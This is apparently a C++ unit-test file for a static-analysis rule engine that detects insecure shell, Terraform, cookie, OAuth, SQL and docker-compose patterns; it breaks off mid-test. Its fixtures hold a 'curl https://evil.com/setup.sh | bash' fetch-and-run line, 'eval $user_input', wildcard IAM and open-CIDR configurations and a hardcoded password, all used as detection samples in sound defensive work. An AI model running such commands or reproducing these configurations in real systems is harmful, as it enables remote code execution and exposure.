/**
 * @file rules_test.cpp
 * @brief Unit tests for rule engine (parsing, pattern, absence, presence, unsupported engines).
 * @see ADR-130 for test architecture (TEST_SUITE + SCENARIO/GIVEN/WHEN/THEN)
 */
#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#include <cstdlib>
#include <fstream>

#include "../vendor/doctest.h"
#include "rules/rule_engine.h"

static std::string create_temp_dir() {
  char template_path[] = "/tmp/cpm_rules_test_XXXXXX";
  char* dir = mkdtemp(template_path);
  return dir ? std::string(dir) : "";
}

static void write_file(const std::string& path, const std::string& content) {
  std::ofstream out(path);
  out << content;
}

static void cleanup_dir(const std::string& dir) {
  // Remove all files in directory then the directory itself
  DIR* d = opendir(dir.c_str());
  if (!d) return;
  struct dirent* entry;
  while ((entry = readdir(d)) != nullptr) {
    std::string name = entry->d_name;
    if (name == "." || name == "..") continue;
    unlink((dir + "/" + name).c_str());
  }
  closedir(d);
  rmdir(dir.c_str());
}

TEST_SUITE("rules") {

  // ============================================================
  // Core engine tests
  // ============================================================

  SCENARIO("parsing a rule file") {
    GIVEN("a .rule file with engine: absence") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      write_file(tmp_dir + "/test.rule",
                 "id: TEST-001\n"
                 "title: Test Rule\n"
                 "engine: absence\n"
                 "severity: error\n"
                 "extensions: .txt\n"
                 "patterns:\n"
                 "  - regex: required_header\n"
                 "    message: Missing required header\n");

      WHEN("the rule is parsed") {
        Rule rule = rule_parse(tmp_dir + "/test.rule");

        THEN("all fields are populated correctly") {
          REQUIRE(rule.id == "TEST-001");
          CHECK(rule.engine == "absence");
          CHECK(rule.severity == "error");
          REQUIRE(rule.patterns.size() == 1);
          CHECK(rule.patterns[0].regex_str == "required_header");
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("pattern engine matches lines") {
    GIVEN("a file with BAD_PATTERN on two lines") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/sample.txt", "line 1: ok\nline 2: BAD_PATTERN\nline 3: BAD_PATTERN\n");

      Rule rule;
      rule.id = "PAT-001";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"BAD_PATTERN", "Found bad pattern"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("it finds both occurrences") {
          REQUIRE(findings.size() == 2);
          CHECK(findings[0].line == 2);
          CHECK(findings[0].rule_id == "PAT-001");
          CHECK(findings[1].line == 3);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("absence engine reports missing patterns") {
    GIVEN("two files, one with and one without a license header") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/has_header.txt", "HEADER_LICENSE_2026\nsome content\n");
      write_file(tmp_dir + "/no_header.txt", "some content without header\n");

      Rule rule;
      rule.id = "ABS-001";
      rule.severity = "error";
      rule.engine = "absence";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"HEADER_LICENSE", "Missing license header"});

      WHEN("the rule scans both files") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("only the file without the header is flagged") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].file == "no_header.txt");
          CHECK(findings[0].line == 1);
          CHECK(findings[0].rule_id == "ABS-001");
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("presence engine reports first match only") {
    GIVEN("a file with FORBIDDEN on two lines") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/multi_match.txt", "line 1: clean\nline 2: FORBIDDEN\nline 3: FORBIDDEN\n");

      Rule rule;
      rule.id = "PRES-001";
      rule.severity = "warning";
      rule.engine = "presence";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"FORBIDDEN", "Forbidden construct present"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("only one finding at the first match") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].line == 2);
          CHECK(findings[0].rule_id == "PRES-001");
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("unsupported engine produces no findings") {
    GIVEN("a rule with an unsupported engine type") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/sample.txt", "line 1: BAD_PATTERN\n");

      Rule rule;
      rule.id = "UNSUP-001";
      rule.severity = "info";
      rule.engine = "unsupported_metric_engine";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"BAD_PATTERN", "Should not trigger"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no findings are produced") { CHECK(findings.empty()); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("invalid regex is handled gracefully") {
    GIVEN("a rule with a broken regex pattern") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/sample.txt", "line 1: BAD_PATTERN\n");

      Rule rule;
      rule.id = "BADREG-001";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"[invalid(regex", "Bad regex"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no findings are produced") { CHECK(findings.empty()); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("oversized files are skipped") {
    GIVEN("a file larger than 1MB") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());

      std::ofstream out(tmp_dir + "/large.txt", std::ios::binary);
      std::string chunk(1024, 'a');
      for (int i = 0; i < 1025; i++) out << chunk;
      out.close();

      Rule rule;
      rule.id = "LARGE-001";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".txt"};
      rule.patterns.push_back({"a", "Match a"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no findings since file is skipped") { CHECK(findings.empty()); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Shell script quality rules (from GitLab MR improvements)
  // ============================================================

  SCENARIO("SH-QUAL-010: missing strict mode detected via absence engine") {
    GIVEN("a script without set -euo pipefail") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/no_strict.sh", "#!/usr/bin/env bash\necho hello\n");
      write_file(tmp_dir + "/has_strict.sh", "#!/usr/bin/env bash\nset -euo pipefail\necho hello\n");

      Rule rule;
      rule.id = "SH-QUAL-010";
      rule.severity = "warning";
      rule.engine = "absence";
      rule.target.extensions = {".sh"};
      rule.patterns.push_back({"set\\s+-o\\s+pipefail|set\\s+-[a-z]*o[a-z]*\\s+pipefail", "Missing set -o pipefail"});

      WHEN("the rule scans both files") {
        auto findings = rules_scan({rule}, tmp_dir);

        THEN("only the script without strict mode is flagged") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].file == "no_strict.sh");
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("SH-QUAL-012: BusyBox-incompatible patterns") {
    GIVEN("a script using grep --include, grep -P, and mapfile") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/script.sh",
                 "#!/usr/bin/env bash\n"
                 "grep --include '*.sh' -r src/\n"
                 "grep -P '\\d+' file.txt\n"
                 "mapfile -t arr < file.txt\n"
                 "echo done\n");

      Rule rule;
      rule.id = "SH-QUAL-012";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".sh"};
      rule.patterns.push_back({"grep\\s+--include", "grep --include not in BusyBox"});
      rule.patterns.push_back({"grep\\s+-P\\b", "grep -P not in BusyBox"});
      rule.patterns.push_back({"\\bmapfile\\b", "mapfile not in BusyBox"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("all three patterns are detected") { REQUIRE(findings.size() == 3); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("SH-QUAL-014: dangerous shell patterns") {
    GIVEN("a script with chmod 777, curl|bash, and eval") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/danger.sh",
                 "#!/usr/bin/env bash\n"
                 "chmod 777 /tmp/share\n"
                 "curl https://evil.com/setup.sh | bash\n"
                 "eval $user_input\n");

      Rule rule;
      rule.id = "SH-QUAL-014";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".sh"};
      rule.patterns.push_back({"chmod\\s+777\\b", "chmod 777"});
      rule.patterns.push_back({"curl\\s+[^|]*\\|\\s*(ba)?sh", "curl | sh"});
      rule.patterns.push_back({"\\beval\\s+", "eval"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("all three dangerous patterns are detected") { REQUIRE(findings.size() == 3); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // IaC security rules (from GitLab MR improvements)
  // ============================================================

  SCENARIO("IAC-SEC-012: broad CIDR ranges in Terraform") {
    GIVEN("a security group with 0.0.0.0/0") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/main.tf",
                 "resource \"aws_security_group_rule\" \"allow_all\" {\n"
                 "  cidr_blocks = [\"0.0.0.0/0\"]\n"
                 "  type        = \"ingress\"\n"
                 "}\n");

      Rule rule;
      rule.id = "IAC-SEC-012";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".tf"};
      rule.patterns.push_back({"\"0\\.0\\.0\\.0/0\"", "CIDR 0.0.0.0/0 allows all"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the broad CIDR is detected") { REQUIRE(findings.size() >= 1); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("IAC-SEC-013: disabled deletion protection") {
    GIVEN("an RDS instance with deletion_protection = false") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/rds.tf",
                 "resource \"aws_db_instance\" \"main\" {\n"
                 "  deletion_protection = false\n"
                 "  skip_final_snapshot = true\n"
                 "}\n");

      Rule rule;
      rule.id = "IAC-SEC-013";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".tf"};
      rule.patterns.push_back({"deletion_protection\\s*=\\s*false", "deletion protection disabled"});
      rule.patterns.push_back({"skip_final_snapshot\\s*=\\s*true", "skip_final_snapshot enabled"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("both misconfigurations are detected") { REQUIRE(findings.size() == 2); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("IAC-SEC-014: EKS public endpoint") {
    GIVEN("an EKS cluster with public endpoint enabled") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/eks.tf",
                 "resource \"aws_eks_cluster\" \"main\" {\n"
                 "  endpoint_public_access = true\n"
                 "  public_access_cidrs    = [\"0.0.0.0/0\"]\n"
                 "}\n");

      Rule rule;
      rule.id = "IAC-SEC-014";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".tf"};
      rule.target.content_contains = "eks";
      rule.patterns.push_back({"endpoint_public_access\\s*=\\s*true", "EKS public endpoint"});
      rule.patterns.push_back({"public_access_cidrs\\s*=\\s*\\[\\s*\"0\\.0\\.0\\.0/0\"\\s*\\]", "EKS open to 0.0.0.0/0"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("both EKS issues are detected") { REQUIRE(findings.size() == 2); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("IAC-SEC-016: wildcard IAM permissions") {
    GIVEN("an IAM policy with Action: *") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/policy.tf",
                 "resource \"aws_iam_policy\" \"admin\" {\n"
                 "  policy = jsonencode({\n"
                 "    Statement = [{\n"
                 "      \"Action\" : \"*\"\n"
                 "      \"Resource\" : \"*\"\n"
                 "    }]\n"
                 "  })\n"
                 "}\n");

      Rule rule;
      rule.id = "IAC-SEC-016";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".tf"};
      rule.target.content_contains = "Action";
      rule.patterns.push_back({"\"Action\"\\s*:\\s*\"\\*\"", "Wildcard IAM Action"});
      rule.patterns.push_back({"\"Resource\"\\s*:\\s*\"\\*\"", "Wildcard IAM Resource"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("both wildcard permissions are detected") { REQUIRE(findings.size() == 2); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("IAC-SEC-017: unencrypted RDS") {
    GIVEN("an RDS instance with encryption disabled") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/db.tf",
                 "resource \"aws_db_instance\" \"unenc\" {\n"
                 "  storage_encrypted          = false\n"
                 "  auto_minor_version_upgrade = false\n"
                 "}\n");

      Rule rule;
      rule.id = "IAC-SEC-017";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".tf"};
      rule.patterns.push_back({"storage_encrypted\\s*=\\s*false", "encryption disabled"});
      rule.patterns.push_back({"auto_minor_version_upgrade\\s*=\\s*false", "auto-patch disabled"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("both issues are detected") { REQUIRE(findings.size() == 2); }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Integration: load actual .rule files
  // ============================================================

  SCENARIO("loading rule files from disk") {
    GIVEN("the rules/shell and rules/iac directories") {
      WHEN("rules are loaded from shell/") {
        auto shell_rules = rules_load("rules/shell");
        THEN("at least 6 shell rules are found") {
          REQUIRE(shell_rules.size() >= 6);
          for (auto& r : shell_rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
            CHECK(!r.severity.empty());
          }
        }
      }
      WHEN("rules are loaded from iac/") {
        auto iac_rules = rules_load("rules/iac");
        THEN("at least 10 IaC rules are found") {
          REQUIRE(iac_rules.size() >= 10);
          for (auto& r : iac_rules) {
            CHECK(!r.id.empty());
            CHECK(!r.patterns.empty());
            CHECK(!r.severity.empty());
          }
        }
      }
    }
  }

  // ============================================================
  // Backend rules — batch 1 (API, session, OAuth, migration, DB, test, resilience)
  // ============================================================

  SCENARIO("API-010: CRUD verbs in REST URL paths") {
    GIVEN("a route file with a CRUD verb in the URL path") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/routes.ts",
                 "router.post('/api/v1/createUser', handler);\n"
                 "router.get('/api/v1/users', listHandler);\n");

      Rule rule;
      rule.id = "API-010";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"\\.(get|post|put|delete|patch)\\(['\"`]\\/[^'\"]*\\/(create|delete|update|remove|add|edit|modify|fetch|get)[A-Z]",
                                "CRUD verb in URL path"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only the createUser route triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "API-010");
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("SESS-010: insecure cookie configuration") {
    GIVEN("a file with httpOnly: false") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/auth.ts",
                 "const opts = {\n"
                 "  httpOnly: false,\n"
                 "  secure: true,\n"
                 "};\n");

      Rule rule;
      rule.id = "SESS-010";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"httpOnly\\s*:\\s*false", "httpOnly:false"});
      rule.patterns.push_back({"secure\\s*:\\s*false", "secure:false"});
      rule.patterns.push_back({"sameSite\\s*:\\s*['\"](?:none|None)['\"]", "sameSite:'none'"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("only httpOnly:false triggers") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "SESS-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("OAUTH-010: OAuth2 implicit grant flow") {
    GIVEN("a config with response_type: 'token'") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/oauth.ts",
                 "const config = {\n"
                 "  response_type: 'token',\n"
                 "  client_id: 'abc',\n"
                 "};\n");

      Rule rule;
      rule.id = "OAUTH-010";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"response_type\\s*[=:]\\s*['\"]?token['\"]?", "implicit grant"});
      rule.patterns.push_back({"grant_type\\s*[=:]\\s*['\"]?implicit['\"]?", "implicit grant type"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the implicit grant is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "OAUTH-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("MIG-010: destructive DDL in migration") {
    GIVEN("a SQL migration with DROP TABLE") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/migrate.sql",
                 "-- Migration: cleanup\n"
                 "DROP TABLE old_sessions;\n"
                 "ALTER TABLE users ADD COLUMN email varchar(255);\n");

      Rule rule;
      rule.id = "MIG-010";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".sql"};
      rule.patterns.push_back({"DROP\\s+TABLE\\s", "DROP TABLE"});
      rule.patterns.push_back({"DROP\\s+COLUMN\\s", "DROP COLUMN"});
      rule.patterns.push_back({"TRUNCATE\\s+TABLE\\s", "TRUNCATE TABLE"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the DROP TABLE is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "MIG-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("MIG-011: non-concurrent index creation") {
    GIVEN("a SQL migration with CREATE INDEX (no CONCURRENTLY)") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/add_index.sql",
                 "CREATE INDEX idx_users_email ON users(email);\n");

      Rule rule;
      rule.id = "MIG-011";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".sql"};
      rule.patterns.push_back({"CREATE\\s+INDEX\\s+(?:IF\\s+NOT\\s+EXISTS\\s+)?\\w", "CREATE INDEX without CONCURRENTLY"});
      rule.patterns.push_back({"CREATE\\s+UNIQUE\\s+INDEX\\s+(?:IF\\s+NOT\\s+EXISTS\\s+)?\\w", "CREATE UNIQUE INDEX without CONCURRENTLY"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the non-concurrent index is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "MIG-011");
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("MIG-012: ADD COLUMN NOT NULL without DEFAULT") {
    GIVEN("a SQL migration adding a NOT NULL column without DEFAULT") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/add_col.sql",
                 "ALTER TABLE users ADD COLUMN status varchar NOT NULL;\n");

      Rule rule;
      rule.id = "MIG-012";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".sql"};
      rule.patterns.push_back({"ADD\\s+COLUMN\\s+\\w+\\s+\\w+[^;]*NOT\\s+NULL\\s*[;,)]", "ADD COLUMN NOT NULL without DEFAULT"});
      rule.patterns.push_back({"ADD\\s+COLUMN\\s+\\w+\\s+\\w+\\s+NOT\\s+NULL\\s*$", "ADD COLUMN NOT NULL without DEFAULT"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the missing DEFAULT is detected") {
          REQUIRE(findings.size() >= 1);
          CHECK(findings[0].rule_id == "MIG-012");
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("DB-010: connection per request") {
    GIVEN("a file creating a new Client per request") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/handler.ts",
                 "export async function getUser(id: string) {\n"
                 "  const client = new Client(\n"
                 "    { connectionString: process.env.DB_URL }\n"
                 "  );\n"
                 "}\n");

      Rule rule;
      rule.id = "DB-010";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"new\\s+Client\\s*\\(", "new Client() per request"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the per-request connection is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "DB-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("TEST-010: skipped tests") {
    GIVEN("a test file with it.skip(") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/app.test.ts",
                 "describe('auth', () => {\n"
                 "  it.skip('should login', () => {});\n"
                 "  it('should logout', () => {});\n"
                 "});\n");

      Rule rule;
      rule.id = "TEST-010";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"(it|test|describe)\\.skip\\s*\\(", "Skipped test"});
      rule.patterns.push_back({"(it|test|describe)\\.only\\s*\\(", ".only() in test"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the skipped test is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "TEST-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("TEST-011: real email addresses in tests") {
    GIVEN("a test file with a gmail address") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/user.test.ts",
                 "const testUser = {\n"
                 "  email: 'john.doe@gmail.com',\n"
                 "  name: 'Test User',\n"
                 "};\n");

      Rule rule;
      rule.id = "TEST-011";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"['\"`][^'\"`]*@(gmail|yahoo|hotmail|outlook|aol|icloud|protonmail)\\.(com|net|org)[^'\"`]*['\"`]",
                                "Real email domain in test"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the real email is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "TEST-011");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  // ============================================================
  // Backend rules — batch 2 (K8S, C#, quality, resilience, Docker)
  // ============================================================

  SCENARIO("K8S-014: missing resource limits (absence engine)") {
    GIVEN("a K8s manifest without resources section") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/deploy.yaml",
                 "apiVersion: apps/v1\n"
                 "kind: Deployment\n"
                 "spec:\n"
                 "  containers:\n"
                 "    - name: app\n"
                 "      image: myapp:latest\n");

      Rule rule;
      rule.id = "K8S-014";
      rule.severity = "warning";
      rule.engine = "absence";
      rule.target.extensions = {".yaml", ".yml"};
      rule.target.content_contains = "containers:";
      rule.patterns.push_back({"resources:", "Missing resources section"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the missing resources section is flagged") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "K8S-014");
        }
      }
      cleanup_dir(tmp_dir);
    }
    GIVEN("a K8s manifest WITH resources section") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/deploy.yaml",
                 "apiVersion: apps/v1\n"
                 "spec:\n"
                 "  containers:\n"
                 "    - name: app\n"
                 "      resources:\n"
                 "        limits:\n"
                 "          memory: 256Mi\n");

      Rule rule;
      rule.id = "K8S-014";
      rule.severity = "warning";
      rule.engine = "absence";
      rule.target.extensions = {".yaml", ".yml"};
      rule.target.content_contains = "containers:";
      rule.patterns.push_back({"resources:", "Missing resources section"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("no finding is produced") {
          CHECK(findings.empty());
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("CS-QUAL-010: async void method") {
    GIVEN("a C# file with async void method") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/service.cs",
                 "public class NotificationService {\n"
                 "  public async void SendNotification(string msg) {\n"
                 "    await _client.SendAsync(msg);\n"
                 "  }\n"
                 "}\n");

      // Note: the rule file uses (?!On[A-Z]|Handle) which is not RE2-compatible.
      // Using the simplified RE2-safe pattern for this test.
      Rule rule;
      rule.id = "CS-QUAL-010";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.extensions = {".cs"};
      rule.patterns.push_back({"async\\s+void\\s+[A-Z]\\w*", "async void method"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the async void method is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "CS-QUAL-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("CS-QUAL-011: new HttpClient per request") {
    GIVEN("a C# file creating HttpClient in a method") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/api.cs",
                 "public async Task<string> FetchData() {\n"
                 "  var client = new HttpClient();\n"
                 "  return await client.GetStringAsync(url);\n"
                 "}\n");

      Rule rule;
      rule.id = "CS-QUAL-011";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".cs"};
      rule.patterns.push_back({"new\\s+HttpClient\\s*\\(", "new HttpClient() per call"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the HttpClient creation is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "CS-QUAL-011");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("QUAL-040: Promise constructor anti-pattern") {
    GIVEN("a JS file with new Promise(async ...)") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/fetch.ts",
                 "const data = new Promise(async (resolve, reject) => {\n"
                 "  const res = await fetch(url);\n"
                 "  resolve(res);\n"
                 "});\n");

      Rule rule;
      rule.id = "QUAL-040";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"new\\s+Promise\\s*\\(\\s*async", "async in Promise constructor"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the anti-pattern is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "QUAL-040");
          CHECK(findings[0].line == 1);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("RES-010: infinite retry loop without backoff") {
    GIVEN("a file with while(true) and catch on the same line") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      // Regex: while\s*\(\s*true\s*\)\s*\{[^}]*catch — needs no } between { and catch
      write_file(tmp_dir + "/worker.ts",
                 "async function poll() {\n"
                 "  while (true) { try { await fetch(url); catch (e) { log(e); }\n"
                 "}\n");

      Rule rule;
      rule.id = "RES-010";
      rule.severity = "warning";
      rule.engine = "pattern";
      rule.target.extensions = {".ts"};
      rule.patterns.push_back({"while\\s*\\(\\s*true\\s*\\)\\s*\\{[^}]*retry", "Infinite retry loop"});
      rule.patterns.push_back({"while\\s*\\(\\s*true\\s*\\)\\s*\\{[^}]*catch", "Infinite loop with catch"});

      WHEN("the rule scans the file") {
        auto findings = rules_scan({rule}, tmp_dir);
        THEN("the infinite retry is detected") {
          REQUIRE(findings.size() == 1);
          CHECK(findings[0].rule_id == "RES-010");
          CHECK(findings[0].line == 2);
        }
      }
      cleanup_dir(tmp_dir);
    }
  }

  SCENARIO("DC-010: secrets in docker-compose") {
    GIVEN("a docker-compose file with a hardcoded password") {
      std::string tmp_dir = create_temp_dir();
      REQUIRE(!tmp_dir.empty());
      write_file(tmp_dir + "/docker-compose.yml",
                 "version: '3'\n"
                 "services:\n"
                 "  db:\n"
                 "    image: postgres:15\n"
                 "    environment:\n"
                 "      PASSWORD: secret123\n");

      Rule rule;
      rule.id = "DC-010";
      rule.severity = "error";
      rule.engine = "pattern";
      rule.target.filenames = {"docker-compose.yml", "docker-compose.yaml"};
      rule.patterns.push_back({"(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)\\s*[:=]\\s*['\"]?\\S{4,}",
                                "Secret value in docker-compose"});

      WHEN("the rule scans the file") {
